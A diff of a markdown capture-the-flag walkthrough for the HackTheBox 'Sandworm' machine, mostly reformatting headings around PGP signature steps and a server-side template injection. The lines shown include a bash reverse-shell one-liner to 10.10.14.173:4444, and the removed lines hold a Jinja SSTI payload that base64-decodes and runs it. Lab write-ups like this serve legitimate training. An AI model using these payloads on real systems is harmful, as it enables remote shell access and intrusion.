@@ -119,7 +119,7 @@ Secret Spy Agency's site appears to provide interactive exercises for PGP encryp
 We are moving to the 'Verify Signature' section, generating a PGP public key and PGP signed message. This can be done using a PGP tool that is already available on Debian distribution
 ![verify nignature](verify_signature.png)
 
-* generate pgp public and private keys ():
+### generate pgp public and private keys:
 
 ```bash
 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]
@@ -178,7 +178,7 @@ x/VT3u7XAwzYvjLtnZuZb+jH4WSqWTxFBDXz9Q5y
 =I2R6
 -----END PGP PUBLIC KEY BLOCK-----
 ```
-* pgp signed message 
+### Generate pgp signed message :
 
 Create a file called 'test' containing any text. Next, to create a PGP signed message, we will sign this file 'test' with our PGP public key using the command:
 
@@ -231,7 +231,7 @@ We generate the PGP public key and PGP signed message in the same way as before.
 ![output of ssti](ssti_1.png)
 
  
-* ssti diagram from Hacktricks
+* SSTI diagram from Hacktricks
 
 ![ssti](ssti_2.png)
 
@@ -247,10 +247,7 @@ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.173/4444 0>&1'" | base64
 
 * The finall payload :
 
-```bash
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzMvNDQ0NCAwPiYxJwo= | base64 -d | bash').read() }}
-
-```
+![ssti payload](ssti_payload.png)
 
 ## atlas –> silentobserver
 
